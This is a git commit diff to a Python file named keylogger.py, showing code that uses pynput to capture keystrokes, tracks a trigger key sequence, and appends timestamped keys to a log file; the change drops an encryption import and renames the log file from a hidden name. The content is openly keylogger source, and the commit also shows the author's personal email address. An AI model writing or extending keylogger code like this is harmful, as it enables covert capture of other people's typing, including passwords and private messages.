463e7c76fb7ad83aab1891247464d2be38045ecc
LucasSantiag <lucassantiago17.cardoso08@gmail.com>
2020-01-17 11:19:49 -0300

    c

--- keylogger.py
+++ keylogger.py
@@ -1,13 +1,12 @@
 from pynput.keyboard import Listener, Key
 from collections import deque
 import datetime
-import pyAesCrypt
 
 password = ['t', 'd', 'k', 'Key.enter', 'Key.shift']
 atualChars = deque(maxlen=5)
 
 def log(key):
-    with open(".log.txt", "a") as file_log:
+    with open("data.txt", "a") as file_log:
         date = datetime.datetime.today()
         file_log.write(date.strftime("%d-%m-%Y %H:%M:%S") + ": " + key + "\n")
 
